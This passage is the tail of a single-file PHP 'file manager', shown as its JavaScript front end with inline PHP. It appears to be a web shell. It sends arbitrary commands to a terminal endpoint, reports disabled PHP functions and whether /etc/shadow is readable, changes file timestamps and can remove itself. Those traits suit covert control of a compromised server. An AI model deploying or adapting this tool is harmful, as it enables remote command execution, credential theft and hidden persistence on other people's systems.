                    Permissions: ${permInfo}
                </div>
                <div style="display: flex; gap: 8px; flex-wrap: wrap;">
                    <button type="button" onclick="app.fileAction('chmod', '${fileData.file_path}', '${fileData.permissions}')" class="btn-small">Chmod</button>
                    <button type="button" onclick="app.fileAction('rename', '${fileData.file_path}')" class="btn-small">Rename</button>
                    <button type="button" onclick="app.fileAction('touch', '${fileData.file_path}', '${fileData.modified}')" class="btn-small">Touch</button>
                    <button type="button" onclick="window.open('${SCRIPT_NAME}?action=download&file=${encodeURIComponent(fileData.file_path)}', '_blank')" class="btn-small">Download</button>
                    <button type="button" onclick="app.fileAction('delete', '${fileData.file_path}')" class="btn-small danger" style="background: var(--color-red); color: white;">Delete</button>
                </div>
            `;

                    this.listingView.style.display = 'none';
                    this.editView.style.display = 'block';

                    setTimeout(() => textarea.focus(), 100);
                },

                // FIXED: Handle file actions from editor
                fileAction(action, filePath, currentValue = '') {
                    const fileData = {
                        name: filePath.split('/').pop().split('\\').pop(), // Handle both / and \
                        path: filePath,
                        perms: currentValue,
                        modified: currentValue
                    };

                    this.handleActionModal(action, fileData);
                },

                async handleHashChange() {
                    this.hideModal();
                    this.hideTerminal();
                    const pathEncoded = window.location.hash.substring(1);
                    if (!pathEncoded) {
                        const currentDir = '<?php echo addslashes(getcwd()); ?>';
                        window.location.hash = basezero_encoder_js(currentDir);
                        return;
                    }
                    this.fetchDirectory(pathEncoded);
                },

                async fetchDirectory(pathEncoded) {
                    this.fileList.innerHTML = `<tr><td colspan="7" style="text-align:center; padding:40px;">Loading...</td></tr>`;
                    try {
                        const response = await fetch(`${SCRIPT_NAME}?action=list&path=${pathEncoded}`);
                        const data = await response.json();
                        if (data.success) {
                            this.isWindows = data.path.is_windows;
                            this.currentUser = data.user;
                            this.render(data);
                        } else {
                            this.showMessage(data.message + (data.debug ? ' [Debug: ' + JSON.stringify(data.debug) + ']' : ''), true);
                        }
                    } catch (error) {
                        this.showMessage('Network or server error: ' + error.message, true);
                    }
                },

                render(data) {
                    this.currentPath = data.path.current;
                    this.filesData = data.files;
                    this.updatePathBar(data.path);
                    this.updateFileList(data.files);
                    this.updateBulkActions(data.clipboard);
                    this.updateFormsCurrentDir(data.path.current);
                    this.updateFilePathPlaceholder();
                    this.showListingView();
                    this.fileSearch.value = '';
                    document.getElementById('path-input').value = this.currentPath;
                },

                navigateToPath() {
                    const inputPath = document.getElementById('path-input').value.trim();
                    if (!inputPath) return;
                    const normalizedPath = inputPath.replace(/[\\]/g, '/');
                    window.location.hash = basezero_encoder_js(normalizedPath);
                },

                showSecurityInfo() {
                    this.modalTitle.textContent = 'Server Security Information';
                    this.modalAction.value = '';
                    this.modalFilePath.value = '';

                    const infoHtml = `
                <div style="font-family: var(--font-mono); font-size: 12px; line-height: 1.6; max-height: 60vh; overflow-y: auto;">
                    <div class="grid grid-cols-2 gap-4">
                        <div>
                            <strong>Server software:</strong><br>
                            <span class="text-muted"><?php echo isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown'; ?></span>
                        </div>
                        <div>
                            <strong>PHP Version:</strong><br>
                            <span class="text-primary"><?php echo PHP_VERSION; ?></span>
                        </div>
                        <div>
                            <strong>OS:</strong><br>
                            <span class="text-muted"><?php echo php_uname(); ?></span>
                        </div>
                    </div>
                    <hr style="border-color: var(--border-default); margin: 12px 0;">
                    
                    <strong>Loaded Apache modules:</strong><br>
                    <div class="text-muted" style="margin-bottom: 12px;">
                    <?php
                    if (function_exists('apache_get_modules')) {
                        echo implode(', ', apache_get_modules());
                    } else {
                        echo 'apache_get_modules() not available';
                    }
                    ?>
                    </div>
                    
                    <strong>Disabled PHP Functions:</strong><br>
                    <div class="text-red" style="margin-bottom: 12px;">
                    <?php
                    $disabled = ini_get('disable_functions');
                    echo empty($disabled) ? 'none' : $disabled;
                    ?>
                    </div>
                    
                    <div class="grid grid-cols-2 gap-4">
                        <div><strong>cURL support:</strong> <?php echo function_exists('curl_version') ? '<span class="text-green">enabled</span>' : '<span class="text-red">disabled</span>'; ?></div>
                        <div><strong>MySQLi support:</strong> <?php echo extension_loaded('mysqli') ? '<span class="text-green">enabled</span>' : '<span class="text-red">disabled</span>'; ?></div>
                        <div><strong>Readable /etc/passwd:</strong> <?php echo is_readable('/etc/passwd') ? '<span class="text-red">yes</span>' : '<span class="text-green">no</span>'; ?></div>
                        <div><strong>Readable /etc/shadow:</strong> <?php echo is_readable('/etc/shadow') ? '<span class="text-red">yes</span>' : '<span class="text-green">no</span>'; ?></div>
                    </div>
                    <br>
                    
                    <strong>OS version:</strong><br>
                    <span class="text-muted"><?php echo @file_get_contents('/proc/version') ? @file_get_contents('/proc/version') : 'N/A'; ?></span><br><br>
                    
                    <div class="grid grid-cols-3 gap-4">
                        <div><strong>Memory limit:</strong><br><?php echo ini_get('memory_limit'); ?></div>
                        <div><strong>Max execution time:</strong><br><?php echo ini_get('max_execution_time'); ?>s</div>
                        <div><strong>Upload max filesize:</strong><br><?php echo ini_get('upload_max_filesize'); ?></div>
                    </div>
                </div>
            `;

                    this.modalBody.innerHTML = infoHtml;
                    this.showModal();
                },

                confirmSelfRemove() {
                    if (confirm('Are you sure you want to delete this file manager? This action cannot be undone!')) {
                        if (confirm('FINAL WARNING: This will permanently delete the file manager script. Continue?')) {
                            fetch(SCRIPT_NAME, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                                body: 'action=self_remove&confirm=yes'
                            })
                                .then(() => {
                                    alert('File manager has been deleted.');
                                    window.location.href = './';
                                })
                                .catch(() => {
                                    alert('Self-removal failed. Please delete manually.');
                                });
                        }
                    }
                },

                updatePathBar({ breadcrumbs, permission_status, is_windows }) {
                    let html = '<span class="text-muted">Path:</span> ';

                    if (is_windows) {
                        let rootPath = 'C:\\';
                        let driveLetter = 'C';

                        if (breadcrumbs.length > 0) {
                            rootPath = breadcrumbs[0].path;
                            if (rootPath.length >= 2 && rootPath[1] === ':') {
                                driveLetter = rootPath[0].toUpperCase();
                                rootPath = driveLetter + ':\\';
                            }
                        } else if (this.currentPath) {
                            if (this.currentPath.length >= 2 && this.currentPath[1] === ':') {
                                driveLetter = this.currentPath[0].toUpperCase();
                                rootPath = driveLetter + ':\\';
                            }
                        }

                        html += `<a href="#${basezero_encoder_js(rootPath)}" class="path-root">
                    <i class="fa-solid fa-hard-drive"></i>
                    ${driveLetter}:\\
                </a>`;
                    } else {
                        html += `<a href="#${basezero_encoder_js('/')}" class="path-root">
                    <i class="fa-solid fa-server"></i>
                    Root
                </a>`;
                    }

                    breadcrumbs.forEach((p, index) => {
                        if (is_windows && p.name.match(/^[A-Za-z]:$/)) return;

                        const customClass = ' class="path-custom"';
                        html += `<span class="crumb-sep">/</span><a href="#${basezero_encoder_js(p.path)}"${customClass} class="crumb">${p.name}</a>`;
                    });

                    let statusIcon = permission_status === 'writable' ? '<i class="fa-solid fa-lock-open text-green"></i>' : '<i class="fa-solid fa-lock text-red"></i>';
                    html += `<span class="path-status ${permission_status}" style="margin-left:auto;">${statusIcon} ${permission_status.toUpperCase()}</span>`;
                    this.pathBar.innerHTML = html;
                },

                updateFileList(files) {
                    let html = '';
                    files.forEach((f, index) => {
                        html += `<tr class="item-row" data-index="${index}"><td class="col-select"><input type="checkbox" name="selected_files[]" value="${f.path}" class="item-checkbox"></td>`;
                        
                        // Icon Column
                        const icon = f.type === 'dir' ? ICONS.dir : (ICONS[f.ext] || ICONS.file);
                        html += `<td class="col-icon">${icon}</td>`;

                        let nameLink;
                        if (f.type === 'dir') {
                            nameLink = `<a href="#${basezero_encoder_js(f.path)}" data-path="${f.path}" data-is-dir="true">${f.name}</a>`;
                        } else {
                            nameLink = `<a href="#" class="file-edit-link" data-path="${f.path}" data-name="${f.name}" data-is-dir="false">${f.name}</a>`;
                        }

                        html += `<td class="col-name"><div title="${f.path}">${nameLink}</div></td>`;
                        html += `<td class="col-size font-mono text-xs">${f.size}</td><td class="col-owner font-mono text-xs">${f.owner}</td><td class="col-perms font-mono text-xs perms-${f.permission_status}">${f.perms}</td><td class="col-date font-mono text-xs text-muted">${f.modified}</td>`;

                        let actions = '<div class="action-group">';
                        if (f.type === 'dir') {
                            if (f.name !== '..') {
                                const chmodBtn = this.isWindows ? '' : `<a class="action-btn" title="Chmod" data-action="chmod" data-path="${f.path}" data-perms="${f.perms}">${ICONS.chmod}</a>`;
                                actions += `${chmodBtn}<a class="action-btn" title="Touch" data-action="touch" data-path="${f.path}" data-time="${f.modified}">${ICONS.touch}</a><a class="action-btn" title="Rename" data-action="rename" data-path="${f.path}">${ICONS.rename}</a>`;
                            }
                        } else {
                            const chmodBtn = this.isWindows ? '' : `<a class="action-btn" title="Chmod" data-action="chmod" data-path="${f.path}" data-perms="${f.perms}">${ICONS.chmod}</a>`;
                            actions += `<a class="action-btn" title="Edit" data-action="edit" data-path="${f.path}">${ICONS.edit}</a>${chmodBtn}<a class="action-btn" title="Touch" data-action="touch" data-path="${f.path}" data-time="${f.modified}">${ICONS.touch}</a><a class="action-btn" title="Rename" data-action="rename" data-path="${f.path}">${ICONS.rename}</a><a class="action-btn" href="${SCRIPT_NAME}?action=download&file=${encodeURIComponent(f.path)}" title="Download" target="_blank">${ICONS.download}</a>`;
                        }
                        actions += '</div>';
                        html += `<td class="col-actions">${actions}</td></tr>`;
                    });
                    this.fileList.innerHTML = html;

                    this.fileList.querySelectorAll('.file-edit-link').forEach(link => {
                        link.addEventListener('click', (e) => {
                            e.preventDefault();
                            const path = link.dataset.path;
                            const name = link.dataset.name;
                            this.showEditView(path, name);
                        });
                    });

                    this.updateSearchResults();
                },

                updateFormsCurrentDir(path) {
                    document.querySelectorAll('.form_current_dir').forEach(input => input.value = path);
                },

                updateBulkActions(clipboard) {
                    const select = document.getElementById('bulk-action-select');
                    const existingPaste = select.querySelector('option[value="paste"]');
                    if (existingPaste) existingPaste.remove();

                    if (clipboard && clipboard.sources && clipboard.sources.length > 0) {
                        const pasteOpt = document.createElement('option');
                        pasteOpt.value = 'paste';
                        pasteOpt.textContent = `Paste (${clipboard.sources.length})`;
                        select.appendChild(pasteOpt);
                    }
                },

                handleSearch(e) {
                    const query = e.target.value.toLowerCase();
                    this.updateSearchResults(query);
                },

                updateSearchResults(query = '') {
                    const rows = this.fileList.querySelectorAll('.item-row');
                    const noResults = document.getElementById('no-results');
                    let visibleCount = 0;

                    rows.forEach(row => {
                        if (query === '') {
                            row.classList.remove('hidden');
                            visibleCount++;
                        } else {
                            const nameCell = row.querySelector('.col-name a');
                            const fileName = nameCell ? nameCell.textContent.toLowerCase() : '';
                            if (fileName.includes(query)) {
                                row.classList.remove('hidden');
                                visibleCount++;
                            } else {
                                row.classList.add('hidden');
                            }
                        }
                    });

                    if (query !== '' && visibleCount === 0) {
                        noResults.style.display = 'block';
                    } else {
                        noResults.style.display = 'none';
                    }
                },

                handleContextMenu(e) {
                    const fileRow = e.target.closest('.item-row');
                    if (!fileRow || e.target.closest('.text-actions')) return;

                    e.preventDefault();
                    const index = parseInt(fileRow.dataset.index);
                    if (index >= 0 && this.filesData[index]) {
                        this.contextTarget = this.filesData[index];
                        this.showContextMenu(e.clientX, e.clientY);
                    }
                },

                showContextMenu(x, y) {
                    if (!this.contextTarget) return;

                    const f = this.contextTarget;
                    let menuItems = [];

                    if (f.type === 'dir') {
                        if (f.name !== '..') {
                            menuItems = [
                                { action: 'copy', text: 'Copy', icon: '<i class="fa-solid fa-copy"></i>' },
                                { action: 'move', text: 'Move', icon: '<i class="fa-solid fa-scissors"></i>' },
                                { action: 'delete', text: 'Delete', icon: '<i class="fa-solid fa-trash text-red"></i>' },
                                { action: 'touch', text: 'Change Time', icon: ICONS.touch },
                                { action: 'rename', text: 'Rename', icon: ICONS.rename }
                            ];
                            if (!this.isWindows) {
                                menuItems.splice(3, 0, { action: 'chmod', text: 'Change Permissions', icon: ICONS.chmod });
                            }
                        }
                    } else {
                        menuItems = [
                            { action: 'edit', text: 'Edit', icon: ICONS.edit },
                            { action: 'download', text: 'Download', icon: ICONS.download },
                            { action: 'copy', text: 'Copy', icon: '<i class="fa-solid fa-copy"></i>' },
                            { action: 'move', text: 'Move', icon: '<i class="fa-solid fa-scissors"></i>' },
                            { action: 'delete', text: 'Delete', icon: '<i class="fa-solid fa-trash text-red"></i>' },
                            { action: 'touch', text: 'Change Time', icon: ICONS.touch },
                            { action: 'rename', text: 'Rename', icon: ICONS.rename }
                        ];
                        if (!this.isWindows) {
                            menuItems.splice(5, 0, { action: 'chmod', text: 'Change Permissions', icon: ICONS.chmod });
                        }
                    }

                    let html = '';
                    menuItems.forEach(item => {
                        html += `<div class="context-item" data-action="${item.action}">${item.icon} ${item.text}</div>`;
                    });

                    this.contextMenu.innerHTML = html;

                    const menuRect = { width: 180, height: menuItems.length * 36 + 8 };
                    const viewport = { width: window.innerWidth, height: window.innerHeight };

                    let finalX = x;
                    let finalY = y;

                    if (x + menuRect.width > viewport.width) {
                        finalX = x - menuRect.width;
                    }

                    if (y + menuRect.height > viewport.height) {
                        finalY = y - menuRect.height;
                    }

                    finalX = Math.max(5, Math.min(finalX, viewport.width - menuRect.width - 5));
                    finalY = Math.max(5, Math.min(finalY, viewport.height - menuRect.height - 5));

                    this.contextMenu.style.left = finalX + 'px';
                    this.contextMenu.style.top = finalY + 'px';
                    this.contextMenu.style.display = 'block';

                    this.contextMenu.querySelectorAll('.context-item').forEach(item => {
                        item.addEventListener('click', () => {
                            const action = item.dataset.action;
                            this.handleContextAction(action, this.contextTarget);
                            this.hideContextMenu();
                        });
                    });
                },

                hideContextMenu() {
                    this.contextMenu.style.display = 'none';
                    this.contextTarget = null;
                },

                handleContextAction(action, fileData) {
                    if (action === 'download') {
                        window.open(`${SCRIPT_NAME}?action=download&file=${encodeURIComponent(fileData.path)}`, '_blank');
                    } else if (action === 'copy' || action === 'move') {
                        const clipboard_data = { action: action, sources: [fileData.path] };
                        document.cookie = `fm_clipboard=${encodeURIComponent(JSON.stringify(clipboard_data))}; path=/; max-age=3600`;
                        this.showMessage(`${fileData.name} added to clipboard for ${action}.`);

                        this.fetchDirectory(basezero_encoder_js(this.currentPath));
                    } else if (action === 'delete') {
                        if (confirm(`Are you sure you want to delete "${fileData.name}"?`)) {
                            this.performSingleDelete(fileData.path);
                        }
                    } else {
                        this.handleActionModal(action, fileData);
                    }
                },

                handleActionClick(e) {
                    const btn = e.target.closest('a.action-btn');
                    if (!btn) return;
                    e.preventDefault();
                    const action = btn.dataset.action;
                    const path = btn.dataset.path;
                    const fileData = this.filesData.find(f => f.path === path);
                    if (fileData) this.handleActionModal(action, fileData);
                },

                handleActionModal(action, fileData) {
                    const filename = fileData.name;
                    if (action === 'edit') {
                        this.showEditView(fileData.path, filename);
                    } else {
                        this.modalTitle.textContent = `${action.charAt(0).toUpperCase() + action.slice(1)}: ${filename}`;
                        this.modalAction.value = action;
                        this.modalFilePath.value = fileData.path;

                        let formHtml = '';
                        if (action === 'rename') {
                            formHtml = `<input type="text" name="new_name" value="${filename}" required style="width:100%">`;
                        }
                        if (action === 'chmod') {
                            if (this.isWindows) {
                                formHtml = `<p style="color: var(--color-orange);">Chmod has limited functionality on Windows. Windows uses ACLs instead of Unix permissions.</p>`;
                            } else {
                                formHtml = `Current: <strong>${fileData.perms}</strong><br><input type="text" name="perms" placeholder="644 (without leading 0)" required style="width:100%">`;
                            }
                        }
                        if (action === 'touch') {
                            formHtml = `<input type="text" name="datetime" value="${fileData.modified}" required style="width:100%">`;
                        }

                        this.modalBody.innerHTML = formHtml;
                        this.showModal();
                    }
                },

                async showEditView(path, filename) {
                    try {
                        const response = await fetch(`${SCRIPT_NAME}?action=get_content&path=${basezero_encoder_js(path)}`);
                        const data = await response.json();

                        if (data.success) {
                            document.getElementById('edit-view-filename').textContent = `Editing: ${filename}`;
                            document.getElementById('edit-file-path').value = path;

                            const textarea = document.getElementById('edit-content');
                            const infoDiv = document.getElementById('editor-info');

                            let typeInput = document.getElementById('edit-file-type');
                            let encodingInput = document.getElementById('edit-encoding');

                            if (!typeInput) {
                                typeInput = document.createElement('input');
                                typeInput.type = 'hidden';
                                typeInput.name = 'file_type';
                                typeInput.id = 'edit-file-type';
                                document.getElementById('edit-form').appendChild(typeInput);
                            }

                            if (!encodingInput) {
                                encodingInput = document.createElement('input');
                                encodingInput.type = 'hidden';
                                encodingInput.name = 'encoding';
                                encodingInput.id = 'edit-encoding';
                                document.getElementById('edit-form').appendChild(encodingInput);
                            }

                            typeInput.value = data.file_type;
                            encodingInput.value = data.encoding;

                            if (data.file_type === 'binary') {
                                textarea.value = data.content;
                                textarea.style.fontFamily = 'monospace';
                                textarea.style.fontSize = '11px';

                                infoDiv.innerHTML = `
                            <span style="color: #ff9800;"><i class="fa-solid fa-triangle-exclamation"></i> Binary file (${data.printable_ratio}% printable)</span><br>
                            Content displayed as HEX. Edit carefully to avoid corruption.<br>
                            <small>Each byte represented as 2 hex characters (00-FF)</small>
                        `;
                                infoDiv.style.background = 'rgba(255, 152, 0, 0.1)';
                                infoDiv.style.padding = '8px';
                                infoDiv.style.borderRadius = '4px';
                            } else {
                                textarea.value = data.content;
                                textarea.style.fontFamily = 'monospace';
                                textarea.style.fontSize = '13px';

                                const byteLength = new Blob([data.content]).size;
                                const lineCount = data.content.split('\n').length;
                                const fileInfo = `${lineCount} lines, ${byteLength} bytes`;
                                const typeInfo = `Mixed content (${data.printable_ratio}% printable)`;
                                const permInfo = data.permissions ? `${data.permissions} | ${data.owner} | ${data.modified}` : '';

                                infoDiv.innerHTML = `
                            <div style="margin-bottom: 8px;">
                                ${fileInfo} | ${typeInfo}${permInfo ? '<br>Permissions: ' + permInfo : ''}
                            </div>
                            <div style="display: flex; gap: 8px; flex-wrap: wrap;">
                                <button type="button" onclick="app.fileAction('chmod', '${path}', '${data.permissions || ''}')" class="btn-small">Chmod</button>
                                <button type="button" onclick="app.fileAction('rename', '${path}')" class="btn-small">Rename</button>
                                <button type="button" onclick="app.fileAction('touch', '${path}', '${data.modified || ''}')" class="btn-small">Touch</button>
                                <button type="button" onclick="window.open('${SCRIPT_NAME}?action=download&file=${encodeURIComponent(path)}', '_blank')" class="btn-small">Download</button>
                                <button type="button" onclick="app.fileAction('delete', '${path}')" class="btn-small danger" style="background: var(--color-red); color: white;">Delete</button>
                            </div>
                        `;

                                infoDiv.style.background = '';
                                infoDiv.style.padding = '';
                            }

                            this.listingView.style.display = 'none';
                            this.editView.style.display = 'block';

                            setTimeout(() => {
                                textarea.focus();
                                if (data.file_type !== 'binary') {
                                    textarea.setSelectionRange(textarea.value.length, textarea.value.length);
                                }
                            }, 100);
                        } else {
                            this.showMessage(data.message, true);
                        }
                    } catch (error) {
                        this.showMessage('Could not fetch file content: ' + error.message, true);
                    }
                },

                async handleEditSave(e) {
                    e.preventDefault();
                    const formData = new FormData(e.target);
                    try {
                        const response = await fetch(SCRIPT_NAME, { method: 'POST', body: formData });
                        const result = await response.json();
                        this.showMessage(result.message, !result.success);
                    } catch (error) {
                        this.showMessage('Save failed: ' + error.message, true);
                    }
                },

                async handleBulkAction(e) {
                    e.preventDefault();
                    const select = document.getElementById('bulk-action-select');
                    const action = select.value;
                    const selected = Array.from(document.querySelectorAll('.item-checkbox:checked')).map(cb => cb.value);

                    if (!action) {
                        this.showMessage('Please select an action.', true);
                        return;
                    }
                    if (selected.length === 0 && action !== 'paste') {
                        this.showMessage('Please select at least one item.', true);
                        return;
                    }
                    if (action === 'delete' && !confirm(`Are you sure you want to delete ${selected.length} item(s)?`)) return;

                    const formData = new FormData();
                    formData.append('ajax', '1');
                    formData.append('bulk_action', action);
                    formData.append('current_dir', this.currentPath);
                    selected.forEach(item => formData.append('selected_files[]', item));

                    try {
                        const response = await fetch(SCRIPT_NAME, { method: 'POST', body: formData });
                        const result = await response.json();
                        this.showMessage(result.message, !result.success);

                        if (result.success) {
                            if (action === 'download' && result.download_file) {
                                window.open(`${SCRIPT_NAME}?action=download&file=${encodeURIComponent(this.currentPath + '/' + result.download_file)}`, '_blank');
                                setTimeout(() => {
                                    fetch(SCRIPT_NAME, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                                        body: `action=cleanup_download&file=${encodeURIComponent(result.download_file)}&current_dir=${encodeURIComponent(this.currentPath)}`
                                    });
                                }, 5000);
                            }

                            this.fetchDirectory(basezero_encoder_js(this.currentPath));
                            this.updateBulkActions(result.clipboard);
                        }
                    } catch (error) {
                        this.showMessage('Bulk action failed: ' + error.message, true);
                    }
                    select.selectedIndex = 0;
                },

                showTerminal() {
                    this.terminalModal.style.display = 'flex';
                    this.terminalOutput.textContent = '';
                    this.updateTerminalHistory();
                    setTimeout(() => this.terminalInput.focus(), 300);
                },

                hideTerminal() {
                    this.terminalModal.style.display = 'none';
                },

                shortenPath(path) {
                    if (path.length <= 30) return path;

                    if (this.isWindows) {
                        const parts = path.split('\\');
                        if (parts.length <= 3) return path;
                        return parts[0] + '\\...\\' + parts[parts.length - 1];
                    } else {
                        const parts = path.split('/');
                        if (parts.length <= 3) return path;

                        if (path.includes('/home/')) {
                            const homeIndex = parts.indexOf('home');
                            if (homeIndex >= 0 && homeIndex + 1 < parts.length) {
                                const username = parts[homeIndex + 1];
                                if (path.startsWith(`/home/${username}`)) {
                                    const relativePath = path.substring(`/home/${username}`.length) || '/';
                                    if (relativePath.length <= 25) {
                                        return '~' + relativePath;
                                    } else {
                                        return '~/...' + relativePath.substring(relativePath.lastIndexOf('/'));
                                    }
                                }
                            }
                        }

                        return '.../' + parts[parts.length - 1];
                    }
                },

                async sendCommand() {
                    const command = this.terminalInput.value.trim();
                    if (!command) return;

                    const shortPath = this.shortenPath(this.currentPath);
                    this.terminalOutput.textContent += `${shortPath}@${this.currentUser} $ ${command}\n`;
                    this.terminalInput.value = '';

                    try {
                        const formData = new FormData();
                        formData.append('c', command);
                        formData.append('current_path', this.currentPath);
                        const response = await fetch(`${SCRIPT_NAME}?action=terminal_cmd`, { method: 'POST', body: formData });
                        const result = await response.json();

                        this.terminalOutput.textContent += result.output + '\n\n';
                        this.terminalOutput.scrollTop = this.terminalOutput.scrollHeight;

                        if (!this.customHistory.includes(command)) {
                            this.customHistory.unshift(command);
                            this.customHistory = this.customHistory.slice(0, 50);
                        }
                        this.historyIndex = -1;
                        this.updateTerminalHistory();

                    } catch (error) {
                        this.terminalOutput.textContent += 'Error: Failed to execute command - ' + error.message + '\n\n';
                    }
                },

                updateTerminalHistory() {
                    const historyContainer = document.getElementById('command-history');
                    if (!historyContainer) return;

                    if (this.customHistory.length === 0) {
                        historyContainer.innerHTML = '<div style="text-align:center; color: var(--text-muted); padding: 10px; font-size: 11px;">No command history</div>';
                        return;
                    }

                    historyContainer.innerHTML = this.customHistory.slice(0, 8).map(cmd =>
                        `<div class="history-item" title="Click to use">${cmd}</div>`
                    ).join('');

                    historyContainer.querySelectorAll('.history-item').forEach(item => {
                        item.addEventListener('click', () => {
                            this.terminalInput.value = item.textContent;
                            this.terminalInput.focus();
                        });
                    });
                },

                showListingView(e) {
                    if (e) e.preventDefault();
                    this.listingView.style.display = 'block';
                    this.editView.style.display = 'none';
                },

                toggleSelectAll(e) {
                    const visibleCheckboxes = Array.from(document.querySelectorAll('.item-checkbox')).filter(cb =>
                        !cb.closest('.item-row').classList.contains('hidden')
                    );
                    visibleCheckboxes.forEach(c => {
                        c.checked = e.target.checked;
                        c.closest('.item-row').classList.toggle('selected', e.target.checked);
                    });
                },

                handleRowSelect(e) {
                    if (e.target.classList.contains('item-checkbox'))
                        e.target.closest('.item-row').classList.toggle('selected', e.target.checked);
                },

                async performSingleDelete(filePath) {
                    const formData = new FormData();
                    formData.append('ajax', '1');
                    formData.append('bulk_action', 'delete');
                    formData.append('current_dir', this.currentPath);
                    formData.append('selected_files[]', filePath);

                    try {
                        const response = await fetch(SCRIPT_NAME, { method: 'POST', body: formData });
                        const result = await response.json();
                        this.showMessage(result.message, !result.success);
                        if (result.success) {
                            this.fetchDirectory(basezero_encoder_js(this.currentPath));
                        }
                    } catch (error) {
                        this.showMessage('Delete failed: ' + error.message, true);
                    }
                },

                showMessage(msg, isError = false) {
                    const icon = isError ? '<i class="fa-solid fa-circle-exclamation"></i>' : '<i class="fa-solid fa-circle-check"></i>';
                    this.messageContainer.innerHTML = `<div class="message-toast ${isError ? 'error' : ''}">${icon} ${msg}</div>`;
                    setTimeout(() => this.messageContainer.innerHTML = '', isError ? 4000 : 2000);
                },

                showModal() {
                    this.modalOverlay.style.display = 'flex';
                },

                hideModal() {
                    this.modalOverlay.style.display = 'none';
                }
            };

            // Make app globally accessible for onclick handlers
            window.app = app;
            app.init();
        });
    </script>
</body>

</html>